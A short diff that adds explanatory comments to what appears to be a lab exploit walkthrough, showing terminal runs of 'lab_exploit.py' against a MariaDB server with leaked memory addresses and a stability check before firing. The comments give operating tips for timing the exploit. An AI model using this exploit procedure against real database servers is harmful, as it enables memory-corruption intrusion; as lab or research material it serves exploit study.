@@ -142,6 +142,11 @@ $ python3 lab_exploit.py --fire
 [*] leaked C(comment_pos)=0x7eff3804b8b0
 [*] CALIB: re-leaked C2=0x7eff3804ddb0  stable=False
 [!] chunk NOT stable across deliver (C moved) -> ABORT before firing
+
+# [!!!!!] This is the interval during which the `comment_pos` buffer stabilizes.
+# The address of `C` from the previous step is the same as the address of `C` in the step where the exploit succeeded.
+# Since this may vary depending on the server configuration,
+# if the `C` address remains consistent when you run the program without the `--fire` variable, switch to `--fire` mode and run it again.
 $ python3 lab_exploit.py --fire
 [*] connected (single arena). server ver: 13.1.0-MariaDB
 [*] MB=0x60b8287d5000 LB=0x7eff60c00000
